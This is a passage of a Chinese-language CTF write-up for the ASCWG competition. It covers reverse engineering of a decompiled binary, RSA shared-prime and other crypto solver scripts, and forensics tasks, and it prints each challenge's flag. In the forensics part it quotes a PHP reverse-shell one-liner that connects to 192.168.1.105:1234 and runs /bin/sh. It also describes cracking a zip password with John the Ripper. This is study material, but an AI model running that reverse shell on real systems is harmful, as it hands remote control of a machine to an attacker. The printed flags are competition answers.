number">1</span><span class="token punctuation">;</span>LABEL_44<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>          v33 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v12 <span class="token operator">=</span> <span class="token string">"joezid"</span><span class="token punctuation">;</span>        v13 <span class="token operator">=</span> v35 <span class="token operator">-</span> <span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token string">"joezid"</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v14 <span class="token operator">=</span> <span class="token operator">*</span>v12<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v12 <span class="token operator">!=</span> v12<span class="token punctuation">[</span>v13<span class="token punctuation">]</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v12<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v14 <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LABEL_61<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        v15 <span class="token operator">=</span> v14 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v12<span class="token punctuation">[</span>v13<span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>LABEL_61<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token punctuation">)</span>          v33 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v33 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      phProv <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      phHash <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      pdwDataLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span>v51<span class="token punctuation">,</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptAcquireContextW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">0xF0000000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptCreateHash</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0x8003u</span><span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>phHash<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptHashData</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> BYTE <span class="token operator">*</span><span class="token punctuation">)</span>lpBuffer<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            pdwDataLen <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptGetHashParam</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> pbData<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pdwDataLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"Your Flag is : ASCWG&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> pdwDataLen<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>                <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"%c%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v51<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pbData<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v51<span class="token punctuation">[</span>pbData<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>              v32 <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"CryptGetHashParam failed: %d\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">else</span>          <span class="token punctuation">&#123;</span>            <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>          <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>LABEL_78<span class="token operator">:</span>      <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"No Flag for you ,Set Your Heart Ablaze to be able to see the flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了不进入LABEL_78，就必须让v11为0。也就必须让*v8 = v8[v9]。</p><p>而 v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)”bbbbb”。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152227.png" alt="2-2-5"></p><p>(_QWORD)”bbbbb” = 字符串bbbb存放的地址</p><p>v8 = 字符串bbbb存放的地址</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152251.png" alt="2-2-6"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152312.png" alt="2-2-7"></p><p>所以综上分析得出 v8[v9]  = v35。所以，问题只要解决v35是什么。</p><p>v35 = (__int64)&amp;lpBuffer[10 * i + 66] + lpBuffer[15];</p><p>lpBuffer[15] = lpBuffer + 15*4，该地址存放的内容为 0x 0000 0080h</p><p> movsxd  rax, dword ptr [rax+3Ch] 可能是跟汇编中 dword ptr 有关，这个地址指向一个双字型数据</p><p>(__int64)&amp;lpBuffer[10*i + 66] = 第[10*i + 66]个元素在内存当中的首地址</p><p>但是按照这样的理解，和汇编代码就出现了不一致的情况。</p><p>汇编代码反映出来的是lpBuffer[15+10*i +66]，之所以乘28h，是因为0x28h = 40。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152332.png" alt="2-2-8"></p><p>综合上面的分析呢，</p><p>v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)”bbbbb” = v35 = lpBuffer[15+10*i +66]</p><p>所以可以根据我们就可以去寻找特定位置处的存放的内容，并根据条件判断中的内容进行修改。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152352.png" alt="2-2-9"></p><p>修改完毕之后，再次运行PE_Anatomy程序之后即能显示出来flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152414.png" alt="2-2-10"></p><p>做了这个题，我有个看法但不知道对不对。我觉得汇编当中，凡是涉及到地址的相关计算，到最后都会对应到相应地址中存放的内容。而不是把计算之后的地址进行操作。</p><p>最后对以下在做题中遇到的指令的知识进行补充。</p><p><strong>movzx eax, word ptr [rax]</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152454.png" alt="2-2-11"></p><p><strong>v34 = (char *)lpBuffer + lpBuffer[15];</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152511.png" alt="2-2-12"></p><p>通过对比汇编，可以发现  我之前对lpBuffer[15]的理解有问题。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152532.png" alt="2-2-13"></p><p>正确的理解方式，lpbuffer[15] = lpbuffer + 15*4（至于这里为什么是15*4(0x3C)，是因为本身Ipbuffer 是int*类型的指针，也就是Ipbuffer变量所存储的64位地址指向了一个int类型的数组空间，int类型在64位下刚好占32位也就是4个字节。）</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152553.png" alt="2-2-14"></p><p><strong>a vs. a[0] vs. *a  vs. &amp;a vs. &amp;a[0]</strong></p><p>参考此<a href="https://blog.csdn.net/baidu_37973494/article/details/83148520">帖子</a>.</p><ol><li><p>a，表示数组名；</p><p> a做左值时表示整个数组的所有空间(10×4=40字节)，又因为C语言规定数组操作时要独立单个操作，不能整体操作数组，所以a不能做左值；</p><p> a做右值表示数组首元素的首地址(首元素首地址就是数组的第0个元素的起始地址，也就是a[0]的起始地址)；</p></li><li><p>a[0]，表示数组的首元素，也就是数组的第0个元素；</p><p> a[0]做左值时表示数组第0个元素对应的内存空间（连续4字节）；</p><p> a[0]做右值时表示数组第0个元素的值（也就是数组第0个元素对应的内存空间中存储的那个数）；</p></li><li><p>&amp;a，表示数组名a取地址，字面意思是数组的地址（数组的地址就是数组的首地址，也叫数组的起始地址）</p><p> &amp;a不能做左值，因为&amp;a实质是一个常量，不是变量因此不能赋值，所以自然不能做左值；</p><p> &amp;a做右值时表示整个数组的首地址；</p></li><li><p>&amp;a[0]，字面意思就是数组第0个元素的首地址（搞清楚[]和&amp;的优先级，[]的优先级要高于&amp;，所以a先和[]结合再取地址）；</p><p> &amp;a[0] 做左值时表示数组首元素首地址所对应的内存空间；</p><p> &amp;a[0] 做右值时等同于a。表示数组首元素的首地址；</p></li></ol><h2 id="3-Crypto"><a href="#3-Crypto" class="headerlink" title="3 Crypto"></a>3 <strong>Crypto</strong></h2><h3 id="3-1-RSA-in-the-wild"><a href="#3-1-RSA-in-the-wild" class="headerlink" title="3-1 RSA in the wild"></a>3-1 <strong>RSA in the wild</strong></h3><p>题目提供了以下一段程序和一段程序的输出，题目主要实现了一个 RSA 加密过程，但是其中每个人加密过程中的 N 不同，但是 P 相同，因此 P 是关键问题。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152621.png" alt="3-1-1"></p><p>首先我们得知 N_i = P*Q_i ，因此可以通过 gcd 算法求个最大公约数，进而求得每个 N。在获得 e、p、q 便可以获得 d，再根据 RSA 加密解密算法，C = M^e(mod N)，M = C^d(mod N) 即可求出原始消息，最后将原始消息进行 long_to_bytes 求解即可，代码如下：</p><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#求解最大公因数方法</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> a<span class="token operator">%</span>b<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> b        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> gcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token comment"># 这里要注意的是，不知道为什么这四个数字当中两两存在共同的 P 而不是四个数有共同的 P</span><span class="token keyword">import</span> libnumN <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9019465093803586877472891652042526017244423267918585684572141459337752636017501282398583984846819147555479788255766221465302452334708306581657478087163498882790399392556915932241903819600243256898710512837026330099749891149718206725456165654975013707057350042189177818505148923810842478214626652504947902299</span><span class="token punctuation">,</span><span class="token number">23938372162005523177999938438562451374665546708075664883194200608993841377868039780046395969369898805670203008718315917149246468698236445400730491330343376568175458641957123986113999188370741703681470314365261825831443108787421922073023609145294588353146041309964285454626205876016177576199911694583578054203</span><span class="token punctuation">,</span><span class="token number">7492176105815056287406737107861152687669914817188441973876375606125509278843647128053495385472184164273276753734355681888283710630052589292533918258041321561584337044160204288159261124250897895150472928088930420119607423773142875636276401786832850472958085716356092462792054479554714349979034664376850407259</span><span class="token punctuation">,</span><span class="token number">19226181445602743460246708025013176246822001005948560833211736039157554695246287037030410489087800335076044816379819628670911825715971233704410525113162113042540729331798511555022529148709471705473637189586448652726834752638590559219127165638752435997278633564685349397058307290548363125722837867180940021419</span><span class="token punctuation">]</span>messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1490803635449005835981793387807741830923148060654731278738509797435451285285034156065878921946571927216460900511251526914548382779631334897120457669789539503101428807041786196779372071069328112093285546177856847259662170258558289415211977744184992082066716124590295955026240499770848142550445898094801157061</span><span class="token punctuation">,</span><span class="token number">6350249974685514311455731678779522359350354799468017596988644954406012738159501505851851861514932395179333372434804220392980343950894714606458923379054304802233466609403548752751709359872922491353578150109676550914201161697356048954377466378161795747517549045847439371181670308693139841054101664947749441303</span><span class="token punctuation">,</span><span class="token number">2544223511735543039595079752083782272939464573374775456475586531619250161960313372895971808675158274512437185309522676978160116122909124405173644335952401335143161289490254404665940426997169777822971888908315046502903142588256830588219713706207832651682400227233863085882991692803261801301182265503150372301</span><span class="token punctuation">,</span><span class="token number">12100625282820382536088469677465402939756857865013288698256765193122801312845842440176118885229553306158666539700152355154084650895509376550887918252093180450562973419960250796728283309496027020169076272415675948089735523228946553123649235016377673362851198236398841047345542435309022329198769047584615575574</span><span class="token punctuation">]</span>E <span class="token operator">=</span> <span class="token number">0x10001</span>P1 <span class="token operator">=</span> gcd<span class="token punctuation">(</span>N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>P2 <span class="token operator">=</span> gcd<span class="token punctuation">(</span>N<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>P <span class="token operator">=</span> <span class="token punctuation">[</span>P1<span class="token punctuation">,</span> P2<span class="token punctuation">,</span> P1<span class="token punctuation">,</span> P2<span class="token punctuation">]</span>Q <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Q<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> c<span class="token punctuation">,</span> n <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span> Q<span class="token punctuation">,</span> messages<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>E <span class="token punctuation">,</span>phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而对所有的进行解码后发现只有一句是有意义的，包含了 flag。</p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;7h3_c0mM0n_9re4t_P0W3r_0f_6r0k3N_R$A&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-OSP"><a href="#3-2-OSP" class="headerlink" title="3-2 OSP"></a>3-2 <strong>OSP</strong></h3><p>题目提供了以下一段程序和一段程序的输出，通过使用 os.urandom 和 getPrime 实现随机的一次一密的加密方式，而解决问题的关键在于我们知道 flag 的格式为 ASCWG{xxx}。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152733.png" alt="3-2-1"></p><p>首先我们知道每一行的输出为 f * p + k，而其中的 p 是固定的，因此我们首先求 p，我们把前三行分别对 65、83、67 进行求取整除法，可以得到可能的 p，接着我们可以得到如下三个数，利用简单的知识便可以得出 p 为第二个数字。</p><pre class="line-numbers language-none"><code class="language-none">8380111610140476221795983343688768916912567646337046868517962485410861365956683801116101404762217959833436887689169125676463370468685179624854108613659563 --&gt; p83801116101404762217959833436887689169125676463370468685179624854108613659565<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>求解出 p 之后，我们将每行分别对 p 求模，便可获得所谓随机的 k 值，进而逆向求解，便可以获得每行所对应的 f，在使用 chr 函数进行转换便可以获得 flag。</p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;Wh47_1f_17&#39;s_N07_@_Pr1M3!-f0ffa3657e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-Teaser-Aha"><a href="#3-3-Teaser-Aha" class="headerlink" title="3-3 Teaser [Aha!]"></a>3-3 <strong>Teaser [Aha!]</strong></h3><p>题目提供了以下一段程序和一段程序的输出，该程序的关键在于先求解 x，接着求解 c1，c2，我们知道 flag 的格式为 ASCWG{xxx}。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152801.png" alt="3-3-1"></p><p>这里我们首先可以利用 sympy 求解 x 的值，代码如下：</p><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token keyword">import</span> sympyhint<span class="token operator">=</span><span class="token number">6573544964235663795110387821358621068738264530355319754834598296204350028845729399053875214556575503920004379593112</span>a<span class="token operator">=</span><span class="token number">12011053116152205388</span>b<span class="token operator">=</span><span class="token number">11423234452039057359</span>x <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>solution <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>x<span class="token operator">**</span><span class="token number">5</span> <span class="token operator">+</span> a<span class="token operator">*</span>b<span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> b<span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token punctuation">(</span>a<span class="token operator">*</span>b<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>b<span class="token operator">*</span>a<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>b<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span>hint <span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># x = 14794740941666750497</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着后面的就是参考了官方的 writeup，其中使用了 <strong>SageMath</strong> 代码如下：</p><pre class="line-numbers language-none"><code class="language-none">F &#x3D; Zmod(N)PR.&lt;c1, c2&gt; &#x3D; PolynomialRing(F)f1 &#x3D; x*a*c1 + b*c2 + a*b - q1f2 &#x3D; a*c2 - x*b*c1 + a*b - q2I &#x3D; Ideal([f1, f2])I.groebner_basis()# [c1 + 129605315639493448970075136922290937178908733835389122798667679999645002511918751225679112934299574414218902904120640354628679425092067997512344836684845210103107098629862452090849238650480459973169748953515560552426758751304034613294461809691584124214680152686132787281209362547560156811179702797894368189923, c2 + 16301823837274342549830986630234325738949194338370818370588794724975224426894656835985621236373909782588949334404482254039646785783224270540302423929586850992446342322491817804966558550730248640999810574168456842642895073832374078601103825246815150330281607599953134437905377383158998850822351263862695676571]# 接着我们求得了 c1 + 129...(mod N)&#x3D;0 以及 c2 + 163...(mod N) &#x3D;0 进而根据以下内容求解C1 &#x3D; F(-129605315639493448970075136922290937178908733835389122798667679999645002511918751225679112934299574414218902904120640354628679425092067997512344836684845210103107098629862452090849238650480459973169748953515560552426758751304034613294461809691584124214680152686132787281209362547560156811179702797894368189923)C2 &#x3D; F(-16301823837274342549830986630234325738949194338370818370588794724975224426894656835985621236373909782588949334404482254039646785783224270540302423929586850992446342322491817804966558550730248640999810574168456842642895073832374078601103825246815150330281607599953134437905377383158998850822351263862695676571)print(int.to_bytes(int(F(C1*C2)), 64, &#39;big&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;8r4in_T3s$s1n9_7h3_Ba51s_0f_9r036n3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-Forensics"><a href="#4-Forensics" class="headerlink" title="4 Forensics"></a>4 Forensics</h2><h3 id="4-1-warmup-1"><a href="#4-1-warmup-1" class="headerlink" title="4-1 warmup #1"></a>4-1 <strong>warmup #1</strong></h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152836.png" alt="4-1-1"></p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;7b4be24b7e1f4ef01ebb62fce8fe3470857edaf7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-warmup-2"><a href="#4-2-warmup-2" class="headerlink" title="4-2 warmup #2"></a>4-2 <strong>warmup #2</strong></h3><p>本关是一道jpg图片隐写的题目。首先仔细观察图片，发现上方存在类似于马赛克的图样，猜测是将flag以某种形式编码(url, base64, ascii或者不同进制下的ascii)后直接写入。查看后发现果然是通过url编码的方式把shell命令写入了图片。根据题目的要求把目标地址的sha1sum的哈希值作为flag上传。</p><p>当然出题人的WriteUp是直接使用strings查看图片中的所有字符串，这样也是同样可以的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152858.png" alt="4-2-1"></p><p>url解码后得到： <code>$sock=fsockopen(&quot;192.168.1.105&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152921.png" alt="4-2-2"></p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;cc0e30c2dc233fc58591c987c4eaf751ff25132b&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-3-WeirdFS"><a href="#4-3-WeirdFS" class="headerlink" title="4-3 WeirdFS"></a>4-3 <strong>WeirdFS</strong></h3><p>本题目给出的一个img镜像文件。首先通过通过fdisk文件查看该硬盘的格式信息，发现时Apple的APFS格式，因此直接在本机上挂载读入。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152945.png" alt="4-3-1">   </p><p>发现了一个有密码的zip文件，其中含有Flag.txt文件。一开始观察zip文件发现其是真加密，并不是考察zip伪加密。所以我们开始打开硬盘下的所有隐藏文件开始寻找zip的密码。但是把所有看似像密码的的字符串尝试后发现都无法打开zip文件。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153005.png" alt="4-3-2"></p><p>最后决定爆破zip文件。这里采用的是John the Ripper密码破解工具，词表选择rockyou.txt，很快就爆破出了密码。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153030.png" alt="4-3-3"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153054.png" alt="4-3-4"></p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;M4C_4N6_1$_Co0l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-4-Persistent-Ghost-Aha"><a href="#4-4-Persistent-Ghost-Aha" class="headerlink" title="4-4 Persistent Ghost [Aha!]"></a>4-4 <strong>Persistent Ghost 